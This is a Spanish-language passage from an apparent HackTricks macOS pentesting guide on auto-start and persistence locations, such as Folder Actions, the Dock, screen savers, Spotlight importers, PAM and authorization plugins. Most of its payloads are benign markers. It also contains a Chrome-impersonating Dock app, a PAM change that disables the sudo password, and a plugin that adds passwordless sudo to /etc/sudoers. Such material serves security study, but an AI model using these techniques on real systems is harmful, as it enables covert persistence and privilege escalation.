LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Si las tareas AT no están habilitadas, las tareas creadas no se ejecutarán.

Los **archivos de job** se encuentran en `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
El nombre del archivo contiene la queue, el número del job y la hora a la que está programado para ejecutarse. Por ejemplo, echemos un vistazo a `a0001a019bdcd2`.

- `a` - esta es la queue
- `0001a` - número del job en hexadecimal, `0x1a = 26`
- `019bdcd2` - tiempo en hexadecimal. Representa los minutos transcurridos desde el epoch. `0x019bdcd2` es `26991826` en decimal. Si lo multiplicamos por 60 obtenemos `1619509560`, que es `GMT: 2021. April 27., Tuesday 7:46:00`.

Si imprimimos el archivo del job, encontramos que contiene la misma información que obtuvimos usando `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Útil para bypass del sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero debes poder llamar a `osascript` con argumentos para contactar con **`System Events`** y poder configurar Folder Actions
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Tiene algunos permisos TCC básicos, como Desktop, Documents y Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Se requiere root
- **Trigger**: acceso a la carpeta especificada
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: acceso a la carpeta especificada

#### Description & Exploitation

Folder Actions son scripts que se activan automáticamente ante cambios en una carpeta, como añadir o eliminar elementos, u otras acciones como abrir o cambiar el tamaño de la ventana de la carpeta. Estas acciones se pueden utilizar para diversas tareas y se pueden activar de distintas formas, como mediante la UI de Finder o comandos de terminal.

Para configurar Folder Actions, tienes opciones como:

1. Crear un workflow de Folder Action con [Automator](https://support.apple.com/guide/automator/welcome/mac) e instalarlo como un servicio.
2. Asociar un script manualmente mediante Folder Actions Setup en el menú contextual de una carpeta.
3. Utilizar OSAScript para enviar mensajes Apple Event a `System Events.app` y configurar programáticamente una Folder Action.
- Este método es especialmente útil para integrar la acción en el sistema, proporcionando un nivel de persistence.

El siguiente script es un ejemplo de lo que puede ejecutar una Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Para que el script anterior pueda utilizarse mediante Folder Actions, compílalo usando:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Después de compilar el script, configura Folder Actions ejecutando el siguiente script. Este script habilitará Folder Actions globalmente y asociará específicamente el script compilado anteriormente a la carpeta Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Ejecuta el script de configuración con:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Esta es la forma de implementar esta persistencia mediante GUI:

Este es el script que se ejecutará:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Compílalo con: `osacompile -l JavaScript -o folder.scpt source.js`

Muévelo a:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Luego, abre la aplicación `Folder Actions Setup`, selecciona la **carpeta que quieres supervisar** y, en tu caso, selecciona **`folder.scpt`** (en mi caso la llamé output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Ahora, si abres esa carpeta con **Finder**, se ejecutará tu script.

Esta configuración se almacenó en el **plist** ubicado en **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** en formato base64.

Ahora, intentemos preparar esta persistencia sin acceso a la GUI:

1. **Copia `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** a `/tmp` para hacer una copia de seguridad:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Elimina** las Folder Actions que acabas de configurar:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Ahora que tenemos un entorno vacío:

3. Copia el archivo de respaldo: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Abre Folder Actions Setup.app para cargar esta configuración: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Esto no me funcionó, pero esas son las instrucciones del writeup:(

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero debes tener instalada una aplicación maliciosa dentro del sistema
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Cuando el usuario hace clic en la aplicación dentro del dock

#### Descripción y explotación

Todas las aplicaciones que aparecen en el Dock se especifican dentro del plist: **`~/Library/Preferences/com.apple.dock.plist`**

Es posible **añadir una aplicación** simplemente con:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Mediante algo de **social engineering**, podrías **suplantar, por ejemplo, a Google Chrome** dentro del dock y ejecutar realmente tu propio script:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Selectores de color

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Útil para bypass del sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Es necesario que ocurra una acción muy específica
- Terminarás en otro sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- `/Library/ColorPickers`
- Se requiere root
- Trigger: Usar el selector de color
- `~/Library/ColorPickers`
- Trigger: Usar el selector de color

#### Descripción y exploit

**Compila** un bundle de selector de color con tu código (podrías usar [**este, por ejemplo**](https://github.com/viktorstrate/color-picker-plus)), añade un constructor (como en la [sección Screen Saver](macos-auto-start-locations.md#screen-saver)) y copia el bundle a `~/Library/ColorPickers`.

Después, cuando se active el selector de color, tu código también debería ejecutarse.

Ten en cuenta que el binario que carga tu library tiene un **sandbox muy restrictivo**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Útil para bypass de sandbox: **No, porque necesitas ejecutar tu propia app**
- TCC bypass: ???

#### Ubicación

- Una app específica

#### Descripción y exploit

Puedes encontrar [aquí un ejemplo de una aplicación](https://github.com/D00MFist/InSync) con una Finder Sync Extension.

Las aplicaciones pueden tener `Finder Sync Extensions`. Esta extensión se incluirá dentro de una aplicación que será ejecutada. Además, para que la extensión pueda ejecutar su código, **debe estar firmada** con algún certificado válido de desarrollador de Apple, debe estar en un **sandbox** (aunque se podrían añadir excepciones relajadas) y debe registrarse con algo como:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Salvapantallas

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Útil para bypass del sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Pero terminarás en un sandbox de aplicación común
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- `/System/Library/Screen Savers`
- Se requieren privilegios de root
- **Trigger**: Seleccionar el salvapantallas
- `/Library/Screen Savers`
- Se requieren privilegios de root
- **Trigger**: Seleccionar el salvapantallas
- `~/Library/Screen Savers`
- **Trigger**: Seleccionar el salvapantallas

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Descripción y exploit

Crea un nuevo proyecto en Xcode y selecciona la plantilla para generar un nuevo **Screen Saver**. Después, añade tu código; por ejemplo, el siguiente código para generar logs.

**Compílalo** y copia el bundle `.saver` a **`~/Library/Screen Savers`**. Después, abre la GUI de Screen Saver y, si simplemente haces clic en él, debería generar muchos logs:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Ten en cuenta que, debido a que dentro de los entitlements del binario que carga este código (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) puedes encontrar **`com.apple.security.app-sandbox`**, estarás **dentro del sandbox común de la aplicación**.

Código del Saver:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Plugins de Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Útil para bypass del sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Pero terminarás en un application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- El sandbox parece muy limitado

#### Ubicación

- `~/Library/Spotlight/`
- **Trigger**: Se crea un archivo nuevo con una extensión gestionada por el plugin de Spotlight.
- `/Library/Spotlight/`
- **Trigger**: Se crea un archivo nuevo con una extensión gestionada por el plugin de Spotlight.
- Se requiere root
- `/System/Library/Spotlight/`
- **Trigger**: Se crea un archivo nuevo con una extensión gestionada por el plugin de Spotlight.
- Se requiere root
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Se crea un archivo nuevo con una extensión gestionada por el plugin de Spotlight.
- Se requiere una app nueva

#### Descripción y explotación

Spotlight es la función de búsqueda integrada de macOS, diseñada para proporcionar a los usuarios **acceso rápido y completo a los datos de sus ordenadores**.\
Para facilitar esta capacidad de búsqueda rápida, Spotlight mantiene una **base de datos propietaria** y crea un índice mediante el **análisis de la mayoría de los archivos**, lo que permite realizar búsquedas rápidas tanto por los nombres de los archivos como por su contenido.

El mecanismo subyacente de Spotlight implica un proceso central llamado 'mds', que significa **'metadata server'.** Este proceso coordina todo el servicio de Spotlight. Además, hay varios daemons 'mdworker' que realizan diversas tareas de mantenimiento, como indexar distintos tipos de archivos (`ps -ef | grep mdworker`). Estas tareas son posibles gracias a los plugins importadores de Spotlight, o **"bundles .mdimporter"**, que permiten a Spotlight comprender e indexar contenido de una amplia variedad de formatos de archivo.

Los plugins o bundles **`.mdimporter`** se encuentran en los lugares mencionados anteriormente y, si aparece un bundle nuevo, se carga en un minuto (no es necesario reiniciar ningún servicio). Estos bundles deben indicar **qué tipo de archivo y extensiones pueden gestionar**; de este modo, Spotlight los utilizará cuando se cree un archivo nuevo con la extensión indicada.

Es posible **encontrar todos los `mdimporters`** cargados ejecutando:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Y, por ejemplo, **/Library/Spotlight/iBooksAuthor.mdimporter** se utiliza para analizar este tipo de archivos (extensiones `.iba` y `.book`, entre otras):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Si compruebas el Plist de otros `mdimporter`, es posible que no encuentres la entrada **`UTTypeConformsTo`**. Esto se debe a que es un _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) integrado y no necesita especificar extensiones.
>
> Además, los plugins predeterminados del sistema siempre tienen prioridad, por lo que un atacante solo puede acceder a archivos que no estén indexados de otra forma por los propios `mdimporters` de Apple.

Para crear tu propio importer, podrías comenzar con este proyecto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), cambiar después el nombre y **`CFBundleDocumentTypes`**, y añadir **`UTImportedTypeDeclarations`** para que admita la extensión que quieras admitir y reflejarla en **`schema.xml`**.\
Después, **cambia** el código de la función **`GetMetadataForFile`** para ejecutar tu payload cuando se cree un archivo con la extensión procesada.

Finalmente, **compila y copia tu nuevo `.mdimporter`** en una de las tres ubicaciones anteriores y podrás comprobar cuándo se carga **monitorizando los logs** o comprobando **`mdimport -L.`**

### ~~Panel de preferencias~~

> [!CAUTION]
> No parece que esto siga funcionando.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Útil para hacer bypass del sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Requiere una acción específica del usuario
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Descripción

No parece que esto siga funcionando.

## Bypass del Sandbox como root

> [!TIP]
> Aquí puedes encontrar ubicaciones de inicio útiles para hacer **bypass del sandbox**, que permiten ejecutar algo simplemente **escribiéndolo en un archivo** siendo **root** y/o requiriendo otras **condiciones extrañas.**

### Periódico

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Útil para hacer bypass del sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Pero necesitas ser root
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Se requiere root
- **Trigger**: Cuando llegue el momento
- `/etc/daily.local`, `/etc/weekly.local` o `/etc/monthly.local`
- Se requiere root
- **Trigger**: Cuando llegue el momento

#### Descripción y explotación

Los scripts periódicos (**`/etc/periodic`**) se ejecutan debido a los **launch daemons** configurados en `/System/Library/LaunchDaemons/com.apple.periodic*`. Ten en cuenta que los scripts almacenados en `/etc/periodic/` se **ejecutan** como el **propietario del archivo**, por lo que esto no funcionará para una posible escalada de privilegios.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Hay otros scripts periódicos que se ejecutarán, indicados en **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Si consigues escribir cualquiera de los archivos `/etc/daily.local`, `/etc/weekly.local` o `/etc/monthly.local`, se **ejecutará tarde o temprano**.

> [!WARNING]
> Ten en cuenta que el script periodic se **ejecutará con el usuario propietario del script**. Por lo tanto, si un usuario normal es el propietario del script, este se ejecutará con los permisos de dicho usuario (esto podría impedir ataques de escalada de privilegios).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Útil para evadir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Pero necesitas ser root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- Siempre se requiere root

#### Descripción y explotación

Como PAM está más enfocado en la **persistencia** y el malware que en la ejecución sencilla dentro de macOS, este blog no ofrecerá una explicación detallada; **lee los writeups para comprender mejor esta técnica**.

Comprueba los módulos PAM con:
```bash
ls -l /etc/pam.d
```
Una técnica de persistence/privilege escalation que abusa de PAM es tan sencilla como modificar el módulo `/etc/pam.d/sudo` y añadir al principio la línea:
```bash
auth       sufficient     pam_permit.so
```
Así que **se verá** algo como esto:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Y por lo tanto, cualquier intento de usar **`sudo` funcionará**.

> [!CAUTION]
> Ten en cuenta que este directorio está protegido por TCC, por lo que es muy probable que el usuario reciba un aviso solicitando acceso.

Otro buen ejemplo es su, donde puedes ver que también es posible proporcionar parámetros a los módulos PAM (y también podrías hacer backdoor a este archivo):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Útil para bypass del sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Pero necesitas ser root y realizar configuraciones adicionales
- TCC bypass: ???

#### Ubicación

- `/Library/Security/SecurityAgentPlugins/`
- Se requiere root
- También es necesario configurar la base de datos de authorization para utilizar el plugin

#### Descripción y explotación

Puedes crear un authorization plugin que se ejecute cuando un usuario inicie sesión para mantener la persistencia. Para obtener más información sobre cómo crear uno de estos plugins, consulta los writeups anteriores (y ten cuidado: uno mal escrito puede bloquearte el acceso y tendrás que limpiar tu Mac desde el recovery mode).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Mueve** el bundle a la ubicación desde la que se cargará:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Finalmente, agrega la **rule** para cargar este Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
El **`evaluate-mechanisms`** indicará al framework de autorización que deberá **llamar a un mecanismo externo para la autorización**. Además, **`privileged`** hará que se ejecute como root.

Actívalo con:
```bash
security authorize com.asdf.asdf
```
Y entonces el **grupo staff debería tener acceso sudo** (lee `/etc/sudoers` para confirmarlo).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Útil para realizar un bypass del sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Pero necesitas ser root y el usuario debe utilizar man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- **`/private/etc/man.conf`**
- Se requiere root
- **`/private/etc/man.conf`**: Cada vez que se utiliza man

#### Descripción y exploit

El archivo de configuración **`/private/etc/man.conf`** indica el binario/script que se utilizará al abrir los archivos de documentación de man. Por lo tanto, la ruta al ejecutable podría modificarse para que, cada vez que el usuario utilice man para leer alguna documentación, se ejecute un backdoor.

Por ejemplo, establece en **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Y luego crea `/tmp/view` como:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Útil para evadir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Pero necesitas ser root y apache debe estar ejecutándose
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
- Httpd no tiene entitlements

#### Ubicación

- **`/etc/apache2/httpd.conf`**
- Se requiere root
- Disparador: Cuando se inicia Apache2

#### Descripción y exploit

Puedes indicar en `/etc/apache2/httpd.conf` que cargue un módulo añadiendo una línea como:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
De esta forma, tus módulos compilados serán cargados por Apache. Lo único es que debes **firmarlo con un certificado válido de Apple**, o bien **añadir un nuevo certificado de confianza** al sistema y **firmarlo** con él.

Después, si es necesario, para asegurarte de que el servidor se iniciará, puedes ejecutar:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Ejemplo de código para Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Marco de auditoría BSM

Informe: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Útil para eludir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Pero necesitas ser root, que auditd esté ejecutándose y provocar un warning
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- **`/etc/security/audit_warn`**
- Se requiere root
- **Disparador**: Cuando auditd detecta un warning

#### Descripción y exploit

Cada vez que auditd detecta un warning, se **ejecuta** el script **`/etc/security/audit_warn`**. Por lo tanto, podrías añadir tu payload en él.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Podrías forzar una advertencia con `sudo audit -n`.

### Startup Items

> [!CAUTION] > **Esto está obsoleto, por lo que no debería encontrarse nada en esos directorios.**

El **StartupItem** es un directorio que debe ubicarse dentro de `/Library/StartupItems/` o `/System/Library/StartupItems/`. Una vez creado este directorio, debe contener dos archivos específicos:

1. Un **rc script**: un shell script que se ejecuta durante el inicio.
2. Un **plist file**, llamado específicamente `StartupParameters.plist`, que contiene varios ajustes de configuración.

Asegúrate de que tanto el rc script como el archivo `StartupParameters.plist` estén correctamente ubicados dentro del directorio **StartupItem** para que el proceso de inicio los reconozca y utilice.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> No puedo encontrar este componente en mi macOS, así que consulta el writeup para obtener más información

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

